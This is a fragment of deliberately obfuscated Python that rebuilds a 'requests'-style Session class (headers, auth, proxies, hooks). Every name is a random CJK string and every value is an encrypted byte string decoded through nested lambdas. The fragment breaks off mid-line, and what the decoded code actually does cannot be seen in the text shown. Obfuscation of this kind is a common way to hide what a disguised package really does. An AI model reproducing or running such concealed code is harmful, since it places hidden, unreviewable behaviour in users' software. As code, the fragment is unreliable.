                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 穅蓌絘愺谉鞂:

        class Session:

            def __init__(self):
                self.headers = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).structures.CaseInsensitiveDict({(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xee'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())(): (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xcb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xcc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xca'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc9'))()]))))())())(), (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))()]))))())())(): (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))()]))))())())().join(((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x13'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))()]))))())())(), (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())())), (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())(): (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc3'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc3'))()]))))())())(), (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))()]))))())())(): (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x04'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0f'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()})
                self.auth = None
                self.proxies = {}
                self.hooks = {event: [] for event in [(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 